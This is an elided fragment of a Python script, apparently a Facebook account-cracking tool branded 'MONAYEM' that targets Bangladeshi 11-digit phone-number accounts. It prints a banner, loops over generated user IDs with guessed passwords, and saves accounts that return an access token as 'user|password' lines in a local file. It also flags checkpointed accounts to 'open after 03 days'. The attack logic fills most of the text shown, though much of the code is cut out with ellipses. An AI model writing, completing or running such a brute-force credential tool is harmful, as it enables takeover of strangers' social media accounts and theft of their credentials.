...
def psb(z):
    for e in z + '\n':
        ...
        sys.stdout.flush()
        time.sleep(0.03)
logo = '\n __  __  ___  _   _    ___   _______ __  __ \n|  \/  |/ _ \| \ | |  / \\ \ / / ____|  \/  |\n| |\/| | | | |  \| | / _ \\ V /|  _| | |\/| |\n| |  | | |_| | |\  |/ ___ \| || |___| |  | |\n|_|  |_|\___/|_| \_/_/   \_\_||_____|_|  |_|'

os.system('clear')
print(logo)
psb('\x1b[1;32mBD 11 DIGIT CLONING START PLEASE WAIT ..........')
for n in range(9999):
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print( '\x1b[1;92m[Monayem-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n')
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ('\x1b[1;93m[Monayem-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n')
